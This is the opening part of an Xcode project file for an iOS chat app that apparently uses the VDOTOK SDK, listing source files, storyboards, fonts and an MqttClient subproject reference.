// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		0F2D2B45298BB1A700E2559A /* MultipartFormDataRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F2D2B44298BB1A700E2559A /* MultipartFormDataRequest.swift */; };
		18D01BD02685A64200DE549A /* Swift+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D01BCF2685A64200DE549A /* Swift+Extensions.swift */; };
		49BF44F2298933A800748AF2 /* UploadFileResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49BF44F1298933A800748AF2 /* UploadFileResponse.swift */; };
		5D11F24E265280820038F05F /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F249265280820038F05F /* Home.storyboard */; };
		5D11F24F265280820038F05F /* HomeRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F24A265280820038F05F /* HomeRouter.swift */; };
		5D11F250265280820038F05F /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F24B265280820038F05F /* HomeViewController.swift */; };
		5D11F251265280820038F05F /* HomeBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F24C265280820038F05F /* HomeBuilder.swift */; };
		5D11F252265280820038F05F /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F24D265280820038F05F /* HomeViewModel.swift */; };
		5D11F26326528D930038F05F /* Manrope-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F25C26528D920038F05F /* Manrope-Bold.ttf */; };
		5D11F26426528D930038F05F /* Manrope-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F25D26528D920038F05F /* Manrope-Light.ttf */; };
		5D11F26526528D930038F05F /* Manrope-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F25E26528D920038F05F /* Manrope-ExtraBold.ttf */; };
		5D11F26626528D930038F05F /* Manrope-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F25F26528D930038F05F /* Manrope-ExtraLight.ttf */; };
		5D11F26726528D930038F05F /* Manrope-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F26026528D930038F05F /* Manrope-Medium.ttf */; };
		5D11F26826528D930038F05F /* Manrope-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F26126528D930038F05F /* Manrope-Regular.ttf */; };
		5D11F26926528D930038F05F /* Manrope-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F26226528D930038F05F /* Manrope-SemiBold.ttf */; };
		5D11F2722653D56A0038F05F /* ChatScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D11F26D2653D56A0038F05F /* ChatScreen.storyboard */; };
		5D11F2732653D56A0038F05F /* ChatScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F26E2653D56A0038F05F /* ChatScreenRouter.swift */; };
		5D11F2742653D56A0038F05F /* ChatScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F26F2653D56A0038F05F /* ChatScreenViewController.swift */; };
		5D11F2752653D56A0038F05F /* ChatScreenBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F2702653D56A0038F05F /* ChatScreenBuilder.swift */; };
		5D11F2762653D56A0038F05F /* ChatScreenViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D11F2712653D56A0038F05F /* ChatScreenViewModel.swift */; };
		5D2DC2BA2841092D00535179 /* Bundle+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D2DC2B92841092D00535179 /* Bundle+Extension.swift */; };
		5D41C909264340C300D33DAA /* ValidateUserNameRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C908264340C300D33DAA /* ValidateUserNameRequest.swift */; };
		5D41C90D2643425800D33DAA /* SignupRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C90C2643425800D33DAA /* SignupRequest.swift */; };
		5D41C9102643436B00D33DAA /* ValidateUserNameService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C90F2643436B00D33DAA /* ValidateUserNameService.swift */; };
		5D41C9142643440700D33DAA /* ObjectTranslation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9132643440700D33DAA /* ObjectTranslation.swift */; };
		5D41C9192643455700D33DAA /* CheckUsernameRepsonse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9182643455700D33DAA /* CheckUsernameRepsonse.swift */; };
		5D41C9212643E7D500D33DAA /* UserResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9202643E7D500D33DAA /* UserResponse.swift */; };
		5D41C9242643E81700D33DAA /* SignupService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9232643E81700D33DAA /* SignupService.swift */; };
		5D41C9272643EC5100D33DAA /* LoginRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9262643EC5100D33DAA /* LoginRequest.swift */; };
		5D41C92F2643EFB500D33DAA /* Login.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D41C92A2643EFB500D33DAA /* Login.storyboard */; };
		5D41C9302643EFB500D33DAA /* LoginRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C92B2643EFB500D33DAA /* LoginRouter.swift */; };
		5D41C9312643EFB500D33DAA /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C92C2643EFB500D33DAA /* LoginViewController.swift */; };
		5D41C9322643EFB500D33DAA /* LoginBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C92D2643EFB500D33DAA /* LoginBuilder.swift */; };
		5D41C9332643EFB500D33DAA /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C92E2643EFB500D33DAA /* LoginViewModel.swift */; };
		5D41C9372643F16400D33DAA /* LoginService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9362643F16400D33DAA /* LoginService.swift */; };
		5D41C93E2644643F00D33DAA /* GroupResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C93D2644643F00D33DAA /* GroupResponse.swift */; };
		5D41C9412644649D00D33DAA /* AllGroupRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9402644649D00D33DAA /* AllGroupRequest.swift */; };
		5D41C9442644652900D33DAA /* AllGroupService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9432644652900D33DAA /* AllGroupService.swift */; };
		5D41C94B2644677700D33DAA /* Groups.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D41C9462644677700D33DAA /* Groups.storyboard */; };
		5D41C94C2644677700D33DAA /* GroupsRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9472644677700D33DAA /* GroupsRouter.swift */; };
		5D41C94D2644677700D33DAA /* GroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9482644677700D33DAA /* GroupsViewController.swift */; };
		5D41C94E2644677700D33DAA /* GroupsBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9492644677700D33DAA /* GroupsBuilder.swift */; };
		5D41C94F2644677700D33DAA /* GroupsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C94A2644677700D33DAA /* GroupsViewModel.swift */; };
		5D41C9562644696600D33DAA /* GroupCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D41C9542644696600D33DAA /* GroupCell.swift */; };
		5D41C9572644696600D33DAA /* GroupCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D41C9552644696600D33DAA /* GroupCell.xib */; };
		5D44E48F26448214009F8123 /* VDOTOKObject.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D44E48E26448214009F8123 /* VDOTOKObject.swift */; };
		5D458CDB26551BE300AC785D /* Inter-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD226551BE200AC785D /* Inter-Thin.ttf */; };
		5D458CDC26551BE300AC785D /* Inter-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD326551BE200AC785D /* Inter-Regular.ttf */; };
		5D458CDD26551BE300AC785D /* Inter-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD426551BE200AC785D /* Inter-Bold.ttf */; };
		5D458CDE26551BE300AC785D /* Inter-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD526551BE200AC785D /* Inter-ExtraBold.ttf */; };
		5D458CDF26551BE300AC785D /* Inter-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD626551BE200AC785D /* Inter-Black.ttf */; };
		5D458CE026551BE300AC785D /* Inter-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD726551BE200AC785D /* Inter-ExtraLight.ttf */; };
		5D458CE126551BE300AC785D /* Inter-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD826551BE200AC785D /* Inter-Light.ttf */; };
		5D458CE226551BE300AC785D /* Inter-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CD926551BE300AC785D /* Inter-Medium.ttf */; };
		5D458CE326551BE300AC785D /* Inter-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5D458CDA26551BE300AC785D /* Inter-SemiBold.ttf */; };
		5D57CD6A2685E8F500873AC2 /* DeleteGroupRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57CD692685E8F500873AC2 /* DeleteGroupRequest.swift */; };
		5D57CD6C2685E98500873AC2 /* DeleteGroupService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57CD6B2685E98500873AC2 /* DeleteGroupService.swift */; };
		5D57CD6E2685F29700873AC2 /* EditGroupRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57CD6D2685F29700873AC2 /* EditGroupRequest.swift */; };
		5D57CD702685F3CD00873AC2 /* EditGroupService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57CD6F2685F3CD00873AC2 /* EditGroupService.swift */; };
		5D57CD98268650BF00873AC2 /* vdotokCert.p12 in Resources */ = {isa = PBXBuildFile; fileRef = 5D57CD97268650BF00873AC2 /* vdotokCert.p12 */; };
		5D57DAC92642964700515FEA /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57DAC82642964700515FEA /* AppDelegate.swift */; };
		5D57DACB2642964700515FEA /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57DACA2642964700515FEA /* SceneDelegate.swift */; };
		5D57DACD2642964700515FEA /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D57DACC2642964700515FEA /* ViewController.swift */; };
		5D57DAD02642964700515FEA /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D57DACE2642964700515FEA /* Main.storyboard */; };
		5D57DAD22642964800515FEA /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5D57DAD12642964800515FEA /* Assets.xcassets */; };
		5D57DAD52642964800515FEA /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5D57DAD32642964800515FEA /* LaunchScreen.storyboard */; };
		5D5C26D3265D814500940856 /* AttachmentViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D5C26D1265D814500940856 /* AttachmentViewController.swift */; };
		5D5C26D4265D814500940856 /* AttachmentViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D5C26D2265D814500940856 /* AttachmentViewController.xib */; };
		5D60CAE4265B894300146F47 /* AllUsersReponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D60CAE3265B894300146F47 /* AllUsersReponse.swift */; };
		5D60CAE7265B89C700146F47 /* AllUserRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D60CAE6265B89C700146F47 /* AllUserRequest.swift */; };
		5D60CAEA265B8A1400146F47 /* AllUsersService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D60CAE9265B8A1400146F47 /* AllUsersService.swift */; };
		5D66896526613C10000132EC /* MessageModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D66896426613C10000132EC /* MessageModel.swift */; };
		5D6F4CD5265E20AA00E21E52 /* ImagePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D6F4CD4265E20AA00E21E52 /* ImagePicker.swift */; };
		5D6F4CD8265E48DC00E21E52 /* DocumentPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D6F4CD7265E48DC00E21E52 /* DocumentPicker.swift */; };
		5D6F4CDB265E721200E21E52 /* AudioVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D6F4CD9265E721200E21E52 /* AudioVC.swift */; };
		5D6F4CDC265E721200E21E52 /* AudioVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D6F4CDA265E721200E21E52 /* AudioVC.xib */; };
		5D6F4CE3265EE0C500E21E52 /* OutgoingAudioCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D6F4CE1265EE0C500E21E52 /* OutgoingAudioCell.swift */; };
		5D6F4CE4265EE0C500E21E52 /* OutgoingAudioCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D6F4CE2265EE0C500E21E52 /* OutgoingAudioCell.xib */; };
		5D6F4CE7265EE0D800E21E52 /* IncomingAudioCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D6F4CE5265EE0D800E21E52 /* IncomingAudioCell.swift */; };
		5D6F4CE8265EE0D800E21E52 /* IncomingAudioCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D6F4CE6265EE0D800E21E52 /* IncomingAudioCell.xib */; };
		5D794A08265BE19600837B91 /* CreateGroupRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D794A07265BE19600837B91 /* CreateGroupRequest.swift */; };
		5D794A0A265BE1F700837B91 /* CreateGroupService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D794A09265BE1F700837B91 /* CreateGroupService.swift */; };
		5D794A0C265BE2A700837B91 /* CreateGroupResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D794A0B265BE2A700837B91 /* CreateGroupResponse.swift */; };
		5D91F7282664BCC800F12715 /* Notification+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F7272664BCC800F12715 /* Notification+Extension.swift */; };
		5D91F7412665556A00F12715 /* OutgoingAttachementCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F73F2665556A00F12715 /* OutgoingAttachementCell.swift */; };
		5D91F7422665556A00F12715 /* OutgoingAttachementCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D91F7402665556A00F12715 /* OutgoingAttachementCell.xib */; };
		5D91F7452665557B00F12715 /* IncomingAttachmentCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F7432665557B00F12715 /* IncomingAttachmentCell.swift */; };
		5D91F7462665557B00F12715 /* IncomingAttachmentCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D91F7442665557B00F12715 /* IncomingAttachmentCell.xib */; };
		5D91F74926657DF200F12715 /* IncomingImageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F74726657DF100F12715 /* IncomingImageCell.swift */; };
		5D91F74A26657DF200F12715 /* IncomingImageCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D91F74826657DF100F12715 /* IncomingImageCell.xib */; };
		5D91F74D2665852200F12715 /* outgoingImageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F74B2665852200F12715 /* outgoingImageCell.swift */; };
		5D91F74E2665852200F12715 /* outgoingImageCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D91F74C2665852200F12715 /* outgoingImageCell.xib */; };
		5D91F7872666652000F12715 /* Data+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F7862666652000F12715 /* Data+Extension.swift */; };
		5D91F79B2668F6CB00F12715 /* UInt+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F79A2668F6CB00F12715 /* UInt+Extension.swift */; };
		5D91F79E2669064F00F12715 /* AuthenticationRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F79D2669064F00F12715 /* AuthenticationRequest.swift */; };
		5D91F7A02669095900F12715 /* AuthenticationService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F79F2669095900F12715 /* AuthenticationService.swift */; };
		5D91F7A2266CB1F100F12715 /* TextView+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D91F7A1266CB1F100F12715 /* TextView+Extensions.swift */; };
		5DA2BAAD2656F359000772FC /* YellowButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DA2BAAC2656F359000772FC /* YellowButton.swift */; };
		5DA2BAB22656F7FA000772FC /* CreateGroupPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DA2BAB02656F7FA000772FC /* CreateGroupPopUp.swift */; };
		5DA2BAB32656F7FA000772FC /* CreateGroupPopUp.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DA2BAB12656F7FA000772FC /* CreateGroupPopUp.xib */; };
		5DD5B97326449DBD00F04599 /* CustomButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DD5B97226449DBD00F04599 /* CustomButton.swift */; };
		5DD5B97726449F6800F04599 /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5DD5B97626449F6800F04599 /* Colors.xcassets */; };
		5DD5B97B2644AE3800F04599 /* Reachability.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DD5B97A2644AE3800F04599 /* Reachability.swift */; };
		5DDC5C432656617600663338 /* Poppins-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C312656617500663338 /* Poppins-Regular.ttf */; };
		5DDC5C452656617600663338 /* Poppins-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C332656617500663338 /* Poppins-Black.ttf */; };
		5DDC5C472656617600663338 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C352656617500663338 /* Poppins-SemiBold.ttf */; };
		5DDC5C4B2656617600663338 /* Poppins-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C392656617600663338 /* Poppins-Medium.ttf */; };
		5DDC5C4C2656617600663338 /* Poppins-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C3A2656617600663338 /* Poppins-Bold.ttf */; };
		5DDC5C4D2656617600663338 /* Poppins-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C3B2656617600663338 /* Poppins-ExtraBold.ttf */; };
		5DDC5C4E2656617600663338 /* Poppins-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C3C2656617600663338 /* Poppins-Light.ttf */; };
		5DDC5C4F2656617600663338 /* Poppins-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C3D2656617600663338 /* Poppins-ExtraLight.ttf */; };
		5DDC5C512656617600663338 /* Poppins-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C3F2656617600663338 /* Poppins-Thin.ttf */; };
		5DDC5C582656628800663338 /* IndigoButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C572656628800663338 /* IndigoButton.swift */; };
		5DDC5C5B2656636100663338 /* NextButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C5A2656636100663338 /* NextButton.swift */; };
		5DDC5C622656684D00663338 /* Contact.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C5D2656684D00663338 /* Contact.storyboard */; };
		5DDC5C632656684D00663338 /* ContactRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C5E2656684D00663338 /* ContactRouter.swift */; };
		5DDC5C642656684D00663338 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C5F2656684D00663338 /* ContactViewController.swift */; };
		5DDC5C652656684D00663338 /* ContactBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C602656684D00663338 /* ContactBuilder.swift */; };
		5DDC5C662656684D00663338 /* ContactViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C612656684D00663338 /* ContactViewModel.swift */; };
		5DDC5C6B2656714800663338 /* ContactCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C692656714800663338 /* ContactCell.swift */; };
		5DDC5C6C2656714800663338 /* ContactCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C6A2656714800663338 /* ContactCell.xib */; };
		5DDC5C7626567A7900663338 /* CreateGroup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7126567A7900663338 /* CreateGroup.storyboard */; };
		5DDC5C7726567A7900663338 /* CreateGroupRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7226567A7900663338 /* CreateGroupRouter.swift */; };
		5DDC5C7826567A7900663338 /* CreateGroupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7326567A7900663338 /* CreateGroupViewController.swift */; };
		5DDC5C7926567A7900663338 /* CreateGroupBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7426567A7900663338 /* CreateGroupBuilder.swift */; };
		5DDC5C7A26567A7900663338 /* CreateGroupViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7526567A7900663338 /* CreateGroupViewModel.swift */; };
		5DDC5C8026567D9700663338 /* CreateGroupCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7E26567D9700663338 /* CreateGroupCell.swift */; };
		5DDC5C8126567D9700663338 /* CreateGroupCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DDC5C7F26567D9700663338 /* CreateGroupCell.xib */; };
		5DF35FD226550966000EB9ED /* OutgoingTextCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DF35FD026550966000EB9ED /* OutgoingTextCell.swift */; };
		5DF35FD326550966000EB9ED /* OutgoingTextCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DF35FD126550966000EB9ED /* OutgoingTextCell.xib */; };
		5DF35FD826550974000EB9ED /* IncomingTextCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DF35FD626550974000EB9ED /* IncomingTextCell.swift */; };
		5DF35FD926550974000EB9ED /* IncomingTextCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DF35FD726550974000EB9ED /* IncomingTextCell.xib */; };
		5DF35FDC265518E5000EB9ED /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DF35FDB265518E5000EB9ED /* Constants.swift */; };
		5DF36004265519D1000EB9ED /* Color+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DF36003265519D1000EB9ED /* Color+Extension.swift */; };
		5DFDB72F264486310005A141 /* ProgressHud.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFDB72E264486310005A141 /* ProgressHud.swift */; };
		5DFE71CD2642AD8200F22B66 /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71CC2642AD8200F22B66 /* Service.swift */; };
		5DFE71D12642ADA700F22B66 /* BaseDataStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71D02642ADA700F22B66 /* BaseDataStore.swift */; };
		5DFE71D42642ADBA00F22B66 /* ApiRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71D32642ADBA00F22B66 /* ApiRequest.swift */; };
		5DFE71DE2642AE4000F22B66 /* SignUp.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5DFE71D92642AE4000F22B66 /* SignUp.storyboard */; };
		5DFE71DF2642AE4000F22B66 /* SignUpRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71DA2642AE4000F22B66 /* SignUpRouter.swift */; };
		5DFE71E02642AE4000F22B66 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71DB2642AE4000F22B66 /* SignUpViewController.swift */; };
		5DFE71E12642AE4000F22B66 /* SignUpBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71DC2642AE4000F22B66 /* SignUpBuilder.swift */; };
		5DFE71E22642AE4000F22B66 /* SignUpViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DFE71DD2642AE4000F22B66 /* SignUpViewModel.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		18D01BFA2686145B00DE549A /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 18D01BF52686145B00DE549A /* MqttClient.xcodeproj */;
			proxyType = 2;
			remoteGlobalIDString = 0080171725482C730094136E;
			remoteInfo = MqttClient;
		};
		18D01BFC2686145B00DE549A /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 18D01BF52686145B00DE549A /* MqttClient.xcodeproj */;
			proxyType = 2;
			remoteGlobalIDString = 0080172025482C730094136E;
			remoteInfo = MqttClientTests;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		5D57CDA62686530F00873AC2 /* Embed Frameworks */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 10;
			files = (
			);
			name = "Embed Frameworks";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		0F2D2B44298BB1A700E2559A /* MultipartFormDataRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultipartFormDataRequest.swift; sourceTree = "<group>"; };
		18D01BCF2685A64200DE549A /* Swift+Extensions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Swift+Extensions.swift"; sourceTree = "<group>"; };
		18D01BF52686145B00DE549A /* MqttClient.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = MqttClient.xcodeproj; path = "../../../chatsdk-ios/MqttClient.xcodeproj"; sourceTree = "<group>"; };
		49BF44F1298933A800748AF2 /* UploadFileResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadFileResponse.swift; sourceTree = "<group>"; };
		5D11F249265280820038F05F /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
		5D11F24A265280820038F05F /* HomeRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeRouter.swift; sourceTree = "<group>"; };
		5D11F24B265280820038F05F /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		5D11F24C265280820038F05F /* HomeBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeBuilder.swift; sourceTree = "<group>"; };
		5D11F24D265280820038F05F /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		5D11F25C26528D920038F05F /* Manrope-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-Bold.ttf"; sourceTree = "<group>"; };
		5D11F25D26528D920038F05F /* Manrope-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-Light.ttf"; sourceTree = "<group>"; };
		5D11F25E26528D920038F05F /* Manrope-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-ExtraBold.ttf"; sourceTree = "<group>"; };
		5D11F25F26528D930038F05F /* Manrope-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-ExtraLight.ttf"; sourceTree = "<group>"; };
		5D11F26026528D930038F05F /* Manrope-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-Medium.ttf"; sourceTree = "<group>"; };
		5D11F26126528D930038F05F /* Manrope-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-Regular.ttf"; sourceTree = "<group>"; };
		5D11F26226528D930038F05F /* Manrope-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Manrope-SemiBold.ttf"; sourceTree = "<group>"; };
		5D11F26D2653D56A0038F05F /* ChatScreen.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = ChatScreen.storyboard; sourceTree = "<group>"; };
		5D11F26E2653D56A0038F05F /* ChatScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatScreenRouter.swift; sourceTree = "<group>"; };
		5D11F26F2653D56A0038F05F /* ChatScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatScreenViewController.swift; sourceTree = "<group>"; };
		5D11F2702653D56A0038F05F /* ChatScreenBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatScreenBuilder.swift; sourceTree = "<group>"; };
		5D11F2712653D56A0038F05F /* ChatScreenViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatScreenViewModel.swift; sourceTree = "<group>"; };
		5D2DC2B92841092D00535179 /* Bundle+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Bundle+Extension.swift"; sourceTree = "<group>"; };
